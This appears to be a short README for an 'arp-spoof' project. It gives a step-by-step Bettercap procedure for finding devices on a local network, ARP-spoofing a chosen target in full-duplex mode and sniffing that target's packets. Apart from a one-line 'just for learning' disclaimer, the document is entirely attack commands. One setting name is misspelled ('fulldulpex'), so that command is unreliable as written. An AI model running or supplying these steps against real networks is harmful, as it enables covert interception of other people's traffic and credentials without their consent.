# arp-spoof
Important : This code juste for learning  : This code get information for other {ip,......} and how choice targets and attking

Here’s a description of how to use the commands:

Using Bettercap for Wi-Fi Targeting
Start Bettercap
1  :  Run the following command to view help documentation and ensure Bettercap is installed properly:


                sudo bettercap help
2 : Enable Network Probing
Use this command to activate network probing and discover devices on the network:

                net.probe on
3  : View Discovered Network Devices
Display a list of devices detected during network probing:

                net.show
4 : Enable ARP Spoofing
        Set ARP spoofing to full-duplex mode for bidirectional packet interception:
        
       1)         set arp.spoof.fulldulpex true
       
       Specify the target device's IP address for ARP spoofing :
       
       2)        set arp.targets <TARGET_IP>
       
       Activate ARP spoofing to intercept traffic between the router and the target:
       
       3)        arp.spoof on

5  :  Activate Packet Sniffing

Enable network sniffing to capture and analyze packets from the targeted device:

              net.sniff on
              




